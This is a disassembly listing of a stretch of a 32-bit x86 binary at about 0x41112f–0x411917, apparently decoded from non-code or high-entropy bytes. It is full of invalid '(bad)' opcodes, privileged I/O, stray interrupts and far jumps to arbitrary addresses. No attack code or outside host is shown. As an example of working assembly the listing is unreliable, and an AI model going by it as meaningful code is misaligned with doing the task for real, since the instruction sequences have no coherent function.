  41112f:	outs   dx,DWORD PTR ds:[esi]
  411130:	push   cs
  411131:	loopne 0x411167
  411133:	mov    dh,BYTE PTR [di]
  411136:	pushf  
  411137:	add    BYTE PTR [edx+0x2b],ch
  41113a:	les    ebx,FWORD PTR [ecx]
  41113c:	pop    ds
  41113d:	push   ebx
  41113e:	xor    al,0x28
  411140:	mov    bh,0x2f
  411142:	mov    esp,DWORD PTR [ecx-0x17]
  411145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411146:	enter  0xe9ba,0x6c
  41114a:	xchg   DWORD PTR [edi],edx
  41114c:	jle    0x411105
  41114e:	mov    dh,0x7a
  411150:	add    DWORD PTR [edx-0x62],ecx
  411153:	xor    eax,0xe67f7989
  411158:	lods   eax,DWORD PTR ds:[esi]
  411159:	sbb    eax,0x11fea4e5
  41115e:	add    DWORD PTR [ebp-0x5c],0x71
  411162:	mov    BYTE PTR [eax-0x55],bh
  411165:	mov    BYTE PTR [esi-0x3e],al
  411168:	or     BYTE PTR [ebx],al
  41116a:	(bad)  
  41116b:	(bad)  
  41116c:	shr    BYTE PTR [edi],1
  41116e:	pop    ecx
  41116f:	outs   dx,DWORD PTR ds:[esi]
  411170:	xor    DWORD PTR [esi+ebp*2+0x6271b162],eax
  411177:	xchg   esi,eax
  411178:	and    al,0x50
  41117a:	xchg   BYTE PTR [edi],ch
  41117c:	inc    edi
  41117d:	clc    
  41117e:	adc    al,0x60
  411180:	int    0x4f
  411182:	popfw  
  411184:	adc    al,0x6c
  411186:	mul    DWORD PTR [edi]
  411188:	inc    edx
  411189:	xchg   edx,eax
  41118a:	(bad)  
  41118b:	cli    
  41118c:	sub    eax,0x95a4102
  411191:	dec    edx
  411192:	cmp    dh,bh
  411194:	out    dx,al
  411195:	popa   
  411196:	adc    BYTE PTR [esi+0x25],0x7a
  41119a:	sub    ebp,DWORD PTR [ecx]
  41119c:	jmp    0xba7e:0x9e91e0a
  4111a3:	cwde   
  4111a4:	sbb    dl,ah
  4111a6:	xor    eax,0xeef13cbd
  4111ab:	arpl   WORD PTR [ecx],di
  4111ad:	push   edi
  4111ae:	push   ecx
  4111af:	imul   esp,DWORD PTR [esi],0x28
  4111b2:	ins    BYTE PTR es:[edi],dx
  4111b3:	mov    cs,WORD PTR [ebp-0x59]
  4111b6:	and    BYTE PTR ds:0xab593194,0x2f
  4111bd:	hlt    
  4111be:	rol    bh,0x58
  4111c1:	aas    
  4111c2:	pop    eax
  4111c3:	push   esi
  4111c4:	mov    dl,dl
  4111c6:	adc    DWORD PTR [eax+0xe],0xffffffd8
  4111ca:	dec    ebp
  4111cb:	mov    bl,0xfa
  4111cd:	pop    edx
  4111ce:	test   DWORD PTR [esi],eax
  4111d0:	xor    al,dh
  4111d2:	lock or DWORD PTR [edi+0x22],esi
  4111d6:	xor    ch,BYTE PTR [eax]
  4111d8:	out    dx,eax
  4111d9:	scas   al,BYTE PTR es:[edi]
  4111da:	push   ebx
  4111db:	je     0x411258
  4111dd:	pop    esi
  4111de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111df:	jge    0x4111fd
  4111e1:	mul    esp
  4111e3:	sub    BYTE PTR ds:0x67894243,dl
  4111e9:	popf   
  4111ea:	mov    dl,0x28
  4111ec:	outs   dx,DWORD PTR ds:[esi]
  4111ed:	lods   eax,DWORD PTR ds:[esi]
  4111ee:	pop    edi
  4111ef:	arpl   WORD PTR [eax],si
  4111f1:	sbb    BYTE PTR [ecx+0x17],al
  4111f4:	mov    BYTE PTR [edx-0x50],bl
  4111f7:	or     dl,bh
  4111f9:	fsub   QWORD PTR [edx]
  4111fb:	add    BYTE PTR [ecx+0x1b28f506],bh
  411201:	jle    0x411247
  411203:	sbb    DWORD PTR [ecx],esi
  411205:	and    BYTE PTR [ebp+0x72],cl
  411208:	pop    ss
  411209:	and    eax,edi
  41120b:	xchg   ebx,eax
  41120c:	jecxz  0x4111dd
  41120e:	call   0x3928:0x93dae325
  411215:	dec    eax
  411216:	and    DWORD PTR [eax],ebx
  411218:	xor    dh,dl
  41121a:	inc    esp
  41121b:	and    DWORD PTR [esi+0xb6fbd31],esp
  411221:	jmp    0xe70f:0x1c16c2f7
  411228:	xor    DWORD PTR [edi+0x72e8a1b7],edx
  41122e:	xchg   BYTE PTR [ebx+0x19],ch
  411231:	jecxz  0x411295
  411233:	mov    ebx,0x296558db
  411238:	push   cs
  411239:	push   esi
  41123a:	mov    ah,0x62
  41123c:	test   ecx,0x81b40c6a
  411242:	lds    ebp,FWORD PTR [edx]
  411244:	pop    edx
  411245:	lock retf 0xcc51
  411249:	hlt    
  41124a:	sbb    al,0xe4
  41124c:	mov    bl,0x2
  41124e:	sar    dl,0x9
  411251:	push   ss
  411252:	js     0x411215
  411254:	cmc    
  411255:	repz jbe 0x4112c8
  411258:	mov    ds:0xd57aa2f3,eax
  41125d:	mov    dh,0xd6
  41125f:	out    dx,eax
  411260:	gs je  0x4112c6
  411263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411264:	xchg   ecx,eax
  411265:	jle    0x4112ab
  411267:	hlt    
  411268:	mov    DWORD PTR [ebp-0x3b88b76d],esi
  41126e:	paddsw mm5,QWORD PTR [edi-0x8ee22f9]
  411275:	int    0x20
  411277:	add    eax,0x7fc29233
  41127c:	mov    ebp,0x262b5386
  411281:	test   eax,0x79d3945f
  411286:	pusha  
  411287:	lock mov dh,bh
  41128a:	xchg   BYTE PTR [ebx-0x2889256b],cl
  411290:	imul   edx,DWORD PTR [edi-0x1b4aeee4],0x6e
  411297:	sub    ecx,DWORD PTR [esi+0x8176d79]
  41129d:	or     dl,BYTE PTR [esi]
  41129f:	jmp    DWORD PTR [edi]
  4112a1:	jb     0x41131f
  4112a3:	nop
  4112a4:	pop    edx
  4112a5:	mov    ebp,0xf1e38eac
  4112aa:	cs xchg esp,eax
  4112ac:	inc    esp
  4112ad:	imul   edi,DWORD PTR [ebx+0x40a2092b],0x7e2fa9f4
  4112b7:	clc    
  4112b8:	and    cl,dh
  4112ba:	mov    dl,0xe0
  4112bc:	stc    
  4112bd:	mov    edx,0x477a3937
  4112c2:	scas   eax,DWORD PTR es:[edi]
  4112c3:	xor    DWORD PTR [ecx+0x34],0x304eb586
  4112ca:	rcl    eax,1
  4112cc:	cmc    
  4112cd:	retf   
  4112ce:	mov    cl,0x29
  4112d0:	cmc    
  4112d1:	int    0x55
  4112d3:	mov    dh,0x8
  4112d5:	shl    BYTE PTR [ebx+0x7d],1
  4112d8:	xchg   DWORD PTR [edx],esi
  4112da:	loopne 0x41132e
  4112dc:	fdiv   st,st(0)
  4112de:	xchg   esp,eax
  4112df:	stos   DWORD PTR es:[edi],eax
  4112e0:	lods   al,BYTE PTR ds:[esi]
  4112e1:	rcr    DWORD PTR [edx-0x56f4f936],1
  4112e7:	mov    dl,0xf7
  4112e9:	ja     0x41136a
  4112eb:	push   esp
  4112ec:	ss (bad) 
  4112ee:	(bad)  
  4112f0:	fwait
  4112f1:	icebp  
  4112f2:	xor    bl,BYTE PTR [esi+0x77]
  4112f5:	and    edi,0xffffffb9
  4112f8:	gs ins BYTE PTR es:[edi],dx
  4112fa:	pop    esp
  4112fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112fc:	sbb    eax,ebp
  4112fe:	xchg   DWORD PTR [ecx],eax
  411300:	aad    0x57
  411302:	fdivr  st(7),st
  411304:	xchg   ebp,eax
  411305:	cmp    BYTE PTR [esi],0x2f
  411308:	and    al,0x97
  41130a:	inc    ebp
  41130b:	cmc    
  41130c:	sahf   
  41130d:	int3   
  41130e:	div    BYTE PTR [esi+ebx*8]
  411311:	or     al,BYTE PTR [edi+0x614e447d]
  411317:	aaa    
  411318:	jecxz  0x41137b
  41131a:	lods   al,BYTE PTR ds:[esi]
  41131b:	sub    BYTE PTR [esi],ch
  41131d:	push   ebp
  41131e:	dec    ecx
  41131f:	in     al,0xf7
  411321:	or     esp,DWORD PTR [eax]
  411323:	push   ds
  411324:	mov    ds:0xe953daa0,eax
  411329:	lea    edx,[esi+0x77]
  41132c:	or     BYTE PTR [esi],cl
  41132e:	ret    0x1bb8
  411331:	xchg   BYTE PTR [eax+0x50],bl
  411334:	or     dh,ch
  411336:	sub    BYTE PTR [edx],ch
  411338:	xchg   ebp,eax
  411339:	mov    ebp,0x90f3f841
  41133e:	dec    edi
  41133f:	mov    esi,0x287fd025
  411344:	les    ebx,FWORD PTR [edi]
  411346:	lea    eax,[ecx-0x161f0dea]
  41134c:	xchg   BYTE PTR [ecx],dh
  41134e:	leave  
  41134f:	iret   
  411350:	loope  0x41130f
  411352:	push   ebp
  411353:	stc    
  411354:	xor    DWORD PTR [ebp-0x5019d724],0x4d
  41135b:	inc    eax
  41135c:	ss (bad) 
  41135e:	sub    al,0xe6
  411360:	mov    BYTE PTR [ebx],dh
  411362:	lods   eax,DWORD PTR ds:[esi]
  411363:	jle    0x41136a
  411365:	inc    ebp
  411366:	xchg   esi,eax
  411367:	cli    
  411368:	mov    edi,0x935c690
  41136d:	sahf   
  41136e:	sub    bh,BYTE PTR [ebp-0x7ddd6352]
  411374:	inc    edx
  411375:	rol    DWORD PTR [esi-0x48a0c0a3],1
  41137b:	xchg   esi,eax
  41137c:	fwait
  41137d:	cwde   
  41137e:	dec    eax
  41137f:	sub    BYTE PTR [edx+esi*2-0x4c0eb363],bh
  411386:	in     eax,dx
  411387:	in     eax,dx
  411388:	push   es
  411389:	shl    BYTE PTR [esi-0x53],0xf3
  41138d:	adc    ecx,DWORD PTR [edi+0x3715803]
  411393:	adc    dl,BYTE PTR [edx-0x1062890d]
  411399:	nop
  41139a:	or     eax,0xb72880b6
  41139f:	test   edi,esi
  4113a1:	inc    ebp
  4113a2:	fbld   TBYTE PTR [edx]
  4113a4:	push   ecx
  4113a5:	inc    edi
  4113a6:	and    al,0x75
  4113a8:	dec    edx
  4113a9:	lock in al,dx
  4113ab:	imul   eax,DWORD PTR [ecx-0x8d951],0x69168b8f
  4113b5:	jmp    0x5d04:0x9fa9fd87
  4113bc:	imul   ecx,DWORD PTR [edi],0x48242809
  4113c2:	or     al,0xc4
  4113c4:	cmp    BYTE PTR [ecx+0x54],cl
  4113c7:	int    0x71
  4113c9:	and    eax,0x65797b87
  4113ce:	popf   
  4113cf:	jmp    DWORD PTR [ecx+0x63f150f1]
  4113d5:	and    DWORD PTR [ebx],ebp
  4113d7:	je     0x411409
  4113d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113da:	or     ecx,0xfffffffe
  4113dd:	rol    DWORD PTR [edi+0x14d823ad],cl
  4113e3:	mov    al,ds:0x28f8866d
  4113e8:	jnp    0x4113f6
  4113ea:	push   0x45
  4113ec:	imul   DWORD PTR [ebx-0x7e]
  4113ef:	pusha  
  4113f0:	loop   0x4113d6
  4113f2:	xor    eax,0xc184483
  4113f7:	push   ecx
  4113f8:	pushf  
  4113f9:	icebp  
  4113fa:	dec    esi
  4113fb:	retf   
  4113fc:	pop    ss
  4113fd:	mov    al,ds:0xf2be41ae
  411402:	dec    ebx
  411403:	(bad)  
  411404:	sbb    dh,cl
  411406:	stc    
  411407:	pop    ebp
  411408:	aaa    
  411409:	into   
  41140a:	in     eax,0x72
  41140c:	cs add eax,0x62f7ffa3
  411412:	push   esp
  411413:	sub    BYTE PTR [edi+0x847a458],bl
  411419:	sub    cl,BYTE PTR [esi+ebx*2]
  41141c:	in     eax,dx
  41141d:	mov    dh,0x37
  41141f:	cdq    
  411420:	ret    0xe0f0
  411423:	mov    WORD PTR [esi+eax*8-0x56],?
  411427:	fs xchg ebx,eax
  411429:	sub    DWORD PTR [eax-0x79264365],edi
  41142f:	and    DWORD PTR [ebp-0x4e],edx
  411432:	jmp    0x4d28:0x2afeeb12
  411439:	mov    esp,0x62ca0
  41143e:	jmp    0xe01d8a6
  411443:	adc    ah,BYTE PTR [ecx+0x667405bc]
  411449:	icebp  
  41144a:	dec    esi
  41144b:	scas   al,BYTE PTR es:[edi]
  41144c:	xlat   BYTE PTR ds:[ebx]
  41144d:	sub    bl,BYTE PTR [ebx-0x9]
  411450:	es pop esi
  411452:	out    0x22,al
  411454:	or     al,ch
  411456:	data16 sbb al,0x3e
  411459:	ds repz pop edi
  41145c:	jno    0x411463
  41145e:	fbld   TBYTE PTR [edi+0x28bdffdf]
  411464:	and    eax,0xf477747b
  411469:	je     0x4114be
  41146b:	sbb    eax,0x537ab6f8
  411470:	jl     0x4114e5
  411472:	xchg   DWORD PTR [edi+0x6d],esi
  411475:	outs   dx,DWORD PTR ds:[esi]
  411476:	xor    eax,0x4e1c6526
  41147b:	das    
  41147c:	dec    eax
  41147d:	popa   
  41147e:	cli    
  41147f:	xor    esp,DWORD PTR [ebp-0x5cf329f8]
  411485:	sbb    BYTE PTR [edi+0x5a3c5793],al
  41148b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41148c:	stc    
  41148d:	sti    
  41148e:	mul    DWORD PTR [eax-0x75]
  411491:	push   0x1cd0265b
  411496:	inc    edi
  411497:	jmp    0x4bb59d0c
  41149c:	pop    ecx
  41149d:	mov    dh,0x99
  41149f:	sub    ch,ch
  4114a1:	mov    bh,0x5c
  4114a3:	pop    esi
  4114a4:	aas    
  4114a5:	jo     0x411521
  4114a7:	sub    DWORD PTR [eax+0x39b0faac],eax
  4114ad:	cwde   
  4114ae:	(bad)  
  4114af:	in     al,dx
  4114b0:	add    eax,0xe7d71364
  4114b5:	or     bl,BYTE PTR [eax]
  4114b7:	sub    ebp,edx
  4114b9:	ror    DWORD PTR [eax-0x3291f528],1
  4114bf:	and    ebx,DWORD PTR [ebx-0x43]
  4114c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c3:	push   eax
  4114c4:	(bad)  
  4114c5:	jnp    0x41150a
  4114c7:	add    eax,0x282d3ad5
  4114cc:	imul   edi,DWORD PTR [ebx-0x28],0x20
  4114d0:	or     DWORD PTR [edx],ebx
  4114d2:	jecxz  0x411493
  4114d4:	lods   al,BYTE PTR ds:[esi]
  4114d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d6:	stc    
  4114d7:	repz mov ds:0xeb8ec4f1,al
  4114dd:	bound  eax,QWORD PTR [edx+0x342ecb1]
  4114e3:	aaa    
  4114e4:	test   BYTE PTR [edx-0x79],0x83
  4114e8:	inc    esi
  4114e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ea:	dec    esp
  4114eb:	jl     0x4114fc
  4114ed:	cli    
  4114ee:	imul   ebp,DWORD PTR [edi],0x4c
  4114f1:	jae    0x411537
  4114f3:	jae    0x41148d
  4114f5:	and    bh,BYTE PTR [eax-0x6e643458]
  4114fb:	sub    eax,0x41b92c5a
  411500:	rcr    esi,cl
  411502:	xchg   BYTE PTR [ebx+0x4dbcf14d],bh
  411508:	push   0x8cd10323
  41150d:	out    0xb0,eax
  41150f:	cs sub cl,dl
  411512:	xchg   ecx,ecx
  411514:	mov    ah,0x59
  411516:	and    esi,0x5d
  411519:	dec    edi
  41151a:	sahf   
  41151b:	das    
  41151c:	das    
  41151d:	sub    eax,0xcfcfa5c2
  411522:	xchg   BYTE PTR [edx+0x1a],bh
  411525:	hlt    
  411526:	inc    ebx
  411527:	ss xchg esp,eax
  411529:	push   eax
  41152a:	mov    ch,0xaa
  41152c:	inc    edi
  41152d:	into   
  41152e:	int    0x29
  411530:	(bad)  
  411531:	pop    edi
  411532:	or     ch,0xf7
  411535:	push   cs
  411536:	les    eax,FWORD PTR [ecx-0x78677765]
  41153c:	push   ds
  41153d:	sbb    edx,DWORD PTR [ecx+ebp*1-0x329b0f4b]
  411544:	in     al,dx
  411545:	xchg   esi,eax
  411546:	leave  
  411547:	pop    edx
  411548:	mov    WORD PTR [ebx-0x58],es
  41154b:	and    BYTE PTR [eax],cl
  41154d:	and    al,0x6e
  41154f:	mov    bh,BYTE PTR [eax-0x6993a013]
  411555:	icebp  
  411556:	clc    
  411557:	out    0xe7,al
  411559:	cmp    al,0x9a
  41155b:	mov    ebx,0x9d9eb842
  411560:	pop    esp
  411561:	mov    dl,0x80
  411563:	gs mov ah,0xf8
  411566:	scas   eax,DWORD PTR es:[edi]
  411567:	sub    al,0x11
  411569:	or     DWORD PTR [edi+0x353d19f8],eax
  41156f:	sub    BYTE PTR [eax-0x8288ea9],cl
  411575:	or     edx,edx
  411577:	and    eax,0x2851339a
  41157c:	cmp    ch,dh
  41157e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157f:	add    ecx,DWORD PTR [esi]
  411581:	dec    esi
  411582:	in     eax,dx
  411583:	push   esp
  411584:	or     BYTE PTR [ebx+0x2fb14889],bh
  41158a:	inc    ebx
  41158b:	shl    DWORD PTR [ecx+0x29358774],1
  411591:	push   edi
  411592:	arpl   bx,cx
  411594:	add    al,0x0
  411596:	fcmovb st,st(1)
  411598:	stos   DWORD PTR es:[edi],eax
  411599:	push   cs
  41159a:	iret   
  41159b:	pandn  mm1,QWORD PTR [eax+0x2b]
  41159f:	sub    esp,eax
  4115a1:	mov    BYTE PTR [ebx+0x45],bh
  4115a4:	adc    eax,0xcb99bad
  4115a9:	sub    BYTE PTR [ecx],dh
  4115ab:	sub    BYTE PTR [edx-0x7b38cb10],ch
  4115b1:	fldz   
  4115b3:	xor    bh,BYTE PTR [ecx+0x6571eb45]
  4115b9:	mov    ch,0x86
  4115bb:	in     eax,0xa0
  4115bd:	adc    eax,0x311338b9
  4115c2:	jle    0x4115ec
  4115c4:	test   BYTE PTR [esi-0x7f1d6819],0x7b
  4115cb:	arpl   WORD PTR ds:0xcff1be3b,bp
  4115d1:	push   ebp
  4115d2:	push   es
  4115d3:	sub    ecx,DWORD PTR [eax+ecx*1+0x76]
  4115d7:	and    al,0x51
  4115d9:	retf   
  4115da:	push   edi
  4115db:	sub    BYTE PTR [ecx+edi*4+0x6c],ch
  4115df:	fisttp QWORD PTR [ecx]
  4115e1:	ins    BYTE PTR es:[edi],dx
  4115e2:	xor    al,0xc7
  4115e4:	inc    edx
  4115e5:	jns    0x4115cf
  4115e7:	loopne 0x41159b
  4115e9:	lock sahf 
  4115eb:	push   esp
  4115ec:	sbb    eax,0x584a5cba
  4115f1:	sbb    dl,dl
  4115f3:	add    cl,BYTE PTR [edi+eax*4]
  4115f6:	xchg   DWORD PTR [edi],ecx
  4115f8:	imul   edx,DWORD PTR ds:0xbd15c5a4,0x5f
  4115ff:	xor    eax,0x5955f1f6
  411604:	jae    0x411670
  411606:	pop    es
  411607:	xor    BYTE PTR [eax+0x6e],bh
  41160a:	sub    BYTE PTR [edi-0x23],bh
  41160d:	pushaw 
  41160f:	sub    BYTE PTR [esi+eiz*2],ah
  411612:	arpl   WORD PTR [edx],bx
  411614:	pop    ecx
  411615:	scas   al,BYTE PTR es:[edi]
  411616:	sbb    eax,0xa4d03829
  41161b:	ds test ebp,0x64da38b2
  411622:	repnz or BYTE PTR [esi],0xd4
  411626:	xchg   esp,eax
  411627:	pop    ds
  411628:	xor    al,0xf1
  41162a:	push   ds
  41162b:	mov    ds:0xdeae020d,eax
  411630:	or     DWORD PTR [esi],ebx
  411632:	jmp    0xa8a5a1cc
  411637:	push   eax
  411638:	push   0x817f04f0
  41163d:	outs   dx,DWORD PTR ds:[esi]
  41163e:	inc    eax
  41163f:	xor    DWORD PTR [eax+0x1107e1a],esp
  411645:	js     0x4115cd
  411647:	dec    ebp
  411648:	stos   DWORD PTR es:[edi],eax
  411649:	cmp    esi,ecx
  41164b:	push   esi
  41164c:	and    eax,ebx
  41164e:	shr    DWORD PTR [ecx],1
  411650:	leave  
  411651:	out    dx,al
  411652:	adc    eax,DWORD PTR [ebx+0x9]
  411655:	mov    ds:0x3bf8b3a9,al
  41165a:	and    eax,0xf16502
  41165f:	xor    DWORD PTR [ebx],esi
  411661:	push   es
  411662:	fwait
  411663:	mov    esi,0xd74c88ed
  411668:	(bad)
  41166b:	call   0x17c176da
  411670:	mov    eax,cs:0xf0dd862d
  411676:	pop    esp
  411677:	shl    BYTE PTR [ebx+0xf],1
  41167a:	cmp    ebp,DWORD PTR [edx]
  41167c:	dec    esp
  41167d:	rcr    BYTE PTR [edx],1
  41167f:	or     BYTE PTR [edx-0xc460f10],dl
  411685:	and    ebp,DWORD PTR [eax-0x33]
  411688:	daa    
  411689:	push   es
  41168a:	mov    edi,0x5e826132
  41168f:	adc    al,0xf7
  411691:	sti    
  411692:	inc    edi
  411693:	push   ebx
  411694:	pop    esp
  411695:	cmc    
  411696:	mov    bh,0x88
  411698:	or     dl,dl
  41169a:	or     eax,0x7a150d32
  41169f:	gs mov esp,0x636d7cf1
  4116a5:	pop    eax
  4116a6:	push   ds
  4116a7:	aad    0x6e
  4116a9:	jnp    0x411638
  4116ab:	jmp    0x411676
  4116ad:	ja     0x411635
  4116af:	fcomip st,st(3)
  4116b1:	inc    esi
  4116b2:	fidiv  DWORD PTR [edi]
  4116b4:	std    
  4116b5:	or     ch,BYTE PTR [ebp+0x29]
  4116b8:	sub    cl,dh
  4116ba:	popf   
  4116bb:	mov    esp,0x9dd912f5
  4116c0:	idiv   DWORD PTR ds:0x51b5596e
  4116c6:	stos   BYTE PTR es:[edi],al
  4116c7:	sub    ecx,DWORD PTR [edi-0x1c]
  4116ca:	(bad)  
  4116cb:	mov    ebx,DWORD PTR [ebx-0x46bb3ea3]
  4116d1:	sbb    al,0xbd
  4116d3:	sub    dl,al
  4116d5:	adc    esi,DWORD PTR [ebp-0x7919e054]
  4116db:	pop    es
  4116dc:	addr16 xchg edx,eax
  4116de:	fwait
  4116df:	sti    
  4116e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e1:	dec    eax
  4116e2:	mov    bh,0x28
  4116e4:	and    DWORD PTR [eax],edx
  4116e6:	int    0x7a
  4116e8:	aaa    
  4116e9:	jp     0x411732
  4116eb:	out    0xa7,al
  4116ed:	sbb    BYTE PTR [edi],ch
  4116ef:	out    dx,eax
  4116f0:	rol    DWORD PTR [edx-0x7a],0x1b
  4116f4:	pushf  
  4116f5:	or     DWORD PTR [esi-0x38],esi
  4116f8:	jno    0x411700
  4116fa:	pop    edi
  4116fb:	sub    BYTE PTR [eax],ah
  4116fd:	or     BYTE PTR [ecx-0x4a5ff7f2],bl
  411703:	icebp  
  411704:	shl    DWORD PTR [esi+0xf],1
  411707:	push   eax
  411708:	(bad)  
  411709:	retf   0x6280
  41170c:	adc    DWORD PTR [ebp+0x7e],ebp
  41170f:	lahf   
  411710:	aaa    
  411711:	inc    ebp
  411712:	sbb    DWORD PTR [edi],0x29
  411715:	adc    al,0x5e
  411717:	dec    edx
  411718:	mov    bl,0x7e
  41171a:	xchg   BYTE PTR [ebp-0x12],bl
  41171d:	leave  
  41171e:	inc    ebp
  41171f:	dec    eax
  411720:	rcr    DWORD PTR [ebx-0x78f7ca8a],cl
  411726:	inc    esi
  411727:	call   0x3fa6cdc2
  41172c:	jge    0x411705
  41172e:	xchg   DWORD PTR [ebx-0x68],ecx
  411731:	or     edx,edx
  411733:	das    
  411734:	xor    eax,0x837cb6b
  411739:	cwde   
  41173a:	popf   
  41173b:	mov    dl,0x29
  41173d:	jno    0x41177e
  41173f:	daa    
  411740:	test   eax,0x1ff7bae3
  411745:	push   eax
  411746:	xchg   BYTE PTR [eax-0xe5b0f99],dh
  41174c:	add    BYTE PTR [esi-0x36],ah
  41174f:	push   ss
  411750:	push   ds
  411751:	repz into 
  411753:	jno    0x411701
  411755:	add    eax,0x3c8c07aa
  41175a:	xchg   bh,ah
  41175c:	(bad)  
  41175d:	cmc    
  41175e:	fdivp  st(1),st
  411760:	andps  xmm4,xmm2
  411763:	or     DWORD PTR [ecx+0x37c012ff],0xffffffb4
  41176a:	mov    ss,eax
  41176c:	sub    eax,0xf41bb351
  411771:	adc    al,BYTE PTR [esi-0x90fb16d]
  411777:	jbe    0x41172a
  411779:	add    al,0xde
  41177b:	mov    ecx,0xcfe9f0b9
  411780:	inc    ecx
  411781:	mov    ch,0x87
  411783:	popa   
  411784:	cld    
  411785:	dec    ecx
  411786:	imul   ecx,DWORD PTR [esi+0x15],0x1929b720
  41178d:	mov    DWORD PTR ds:0x32b4346a,ebx
  411793:	adc    al,0x9
  411795:	adc    BYTE PTR [edi+0x2d84ecc3],0xf7
  41179c:	adc    eax,0xce516ea7
  4117a1:	(bad)  
  4117a2:	mov    ebp,0xf50066f
  4117a7:	push   DWORD PTR [ebx+0x35847cbb]
  4117ad:	pusha  
  4117ae:	xchg   BYTE PTR [ebx-0x12],ch
  4117b1:	imul   ecx,DWORD PTR [edx],0xffffff93
  4117b4:	adc    ebp,0xffffffb1
  4117b7:	sub    BYTE PTR [esp+ebp*1-0x591579cc],cl
  4117be:	jnp    0x411827
  4117c0:	jno    0x4117e8
  4117c2:	xchg   BYTE PTR [ebp+0x3d615fec],bl
  4117c8:	in     eax,0xd0
  4117ca:	call   0x1ba925f7
  4117cf:	adc    al,BYTE PTR [esi]
  4117d1:	push   edx
  4117d2:	repnz stos DWORD PTR es:[edi],eax
  4117d4:	ret    0x79fa
  4117d7:	pushf  
  4117d8:	xchg   DWORD PTR [ecx+ecx*1-0x72],edi
  4117dc:	jecxz  0x41175e
  4117de:	inc    ecx
  4117df:	xor    eax,0xb7501168
  4117e4:	rcr    DWORD PTR [edi-0x1b888f4b],1
  4117ea:	outs   dx,BYTE PTR ds:[esi]
  4117eb:	sub    eax,0x1f696c77
  4117f0:	or     BYTE PTR [ebx+ebx*8],bh
  4117f3:	push   es
  4117f4:	cwde   
  4117f5:	test   DWORD PTR [ecx+0x21],ecx
  4117f8:	aaa    
  4117f9:	idiv   al
  4117fb:	pushf  
  4117fc:	xor    DWORD PTR [esi],esp
  4117fe:	or     di,si
  411801:	push   ebx
  411802:	call   0xfdd19e31
  411807:	xor    BYTE PTR [esi-0x3293950f],0x71
  41180e:	xor    BYTE PTR [edx+0x15],ch
  411811:	aam    0x75
  411813:	sbb    dh,BYTE PTR [esi+eiz*2]
  411816:	push   0x7d790857
  41181b:	in     eax,0x38
  41181d:	xor    ecx,DWORD PTR [ebx]
  41181f:	add    al,0xb7
  411821:	repz mov ch,ah
  411824:	in     al,dx
  411825:	arpl   WORD PTR [esi+0x14],ax
  411828:	out    dx,al
  411829:	pop    ecx
  41182a:	sub    esp,esi
  41182c:	dec    edi
  41182d:	sahf   
  41182e:	adc    DWORD PTR ds:0xcf3bd80c,esi
  411834:	repz xor ch,dh
  411837:	jmp    0x618e:0x8adaf1c6
  41183e:	shl    BYTE PTR [ebx+0x4c1c40b1],cl
  411844:	(bad)  [ecx-0x43]
  411847:	ror    DWORD PTR [ebp-0x6fb878d6],0xcd
  41184e:	adc    al,0xeb
  411850:	jecxz  0x4118c2
  411852:	test   BYTE PTR [ebx-0x30],cl
  411855:	pop    ebx
  411856:	mov    ch,0x9f
  411858:	or     ebp,DWORD PTR [esi]
  41185a:	imul   edi,DWORD PTR [eax+0x4],0xc2a7e7fe
  411861:	inc    ecx
  411862:	ins    BYTE PTR es:[edi],dx
  411863:	call   0x29565399
  411868:	(bad)  
  411869:	sahf   
  41186a:	call   0x78c0:0x48aa0915
  411871:	or     eax,0xf1ea7a29
  411876:	or     dl,BYTE PTR [eax-0x9fd4318]
  41187c:	xor    cl,al
  41187e:	enter  0x6595,0xae
  411882:	xchg   BYTE PTR [ebx-0x4eb69bdb],ch
  411888:	jg     0x4118b6
  41188a:	fbstp  TBYTE PTR [edi+eax*2]
  41188d:	adc    esi,DWORD PTR [ecx+edi*8+0x20]
  411891:	jmp    0x4b88:0x1ff7c913
  411898:	sub    eax,0xf89a1d86
  41189d:	icebp  
  41189e:	les    edx,FWORD PTR [eax+0x194e9918]
  4118a4:	mov    esp,0xbf53bf74
  4118a9:	sbb    bh,BYTE PTR [ebp-0x7a7e4869]
  4118af:	cmp    esi,DWORD PTR [ecx-0x27cf41b]
  4118b5:	test   BYTE PTR [ecx+0x29],cl
  4118b8:	arpl   WORD PTR [ebx],di
  4118ba:	pusha  
  4118bb:	and    ecx,DWORD PTR [ecx]
  4118bd:	xchg   esi,eax
  4118be:	fwait
  4118bf:	lods   al,BYTE PTR ds:[esi]
  4118c0:	das    
  4118c1:	mov    BYTE PTR [edx+0x4b],al
  4118c4:	out    dx,eax
  4118c5:	enter  0x1c80,0x35
  4118c9:	jno    0x41191a
  4118cb:	push   0x20
  4118cd:	xchg   DWORD PTR [esi-0x2033f476],ecx
  4118d3:	scas   eax,DWORD PTR es:[edi]
  4118d4:	mov    ebp,edi
  4118d6:	lahf   
  4118d7:	fwait
  4118d8:	aad    0x37
  4118da:	(bad)  
  4118db:	out    dx,eax
  4118dc:	test   DWORD PTR [esi],0x35c3b989
  4118e2:	cld    
  4118e3:	es test al,0xb0
  4118e6:	inc    edx
  4118e7:	pop    eax
  4118e8:	out    0x43,eax
  4118ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118eb:	push   edx
  4118ec:	dec    esi
  4118ed:	test   BYTE PTR [edi-0x1a1f27cf],0x46
  4118f4:	test   eax,0xe1290763
  4118f9:	mov    ds:0x5f7c83b,al
  4118fe:	stos   BYTE PTR es:[edi],al
  4118ff:	or     ah,BYTE PTR [ecx-0xa]
  411902:	aas    
  411903:	jge    0x411944
  411905:	test   al,0xfc
  411907:	and    esi,DWORD PTR [edi+eiz*8-0x68]
  41190b:	lods   eax,DWORD PTR ds:[esi]
  41190c:	test   DWORD PTR [esp+esi*8],0x20b6406c
  411913:	push   ebp
  411914:	jns    0x411951
  411916:	outs   dx,DWORD PTR ds:[esi]
  411917:	mov    bl,0xc9
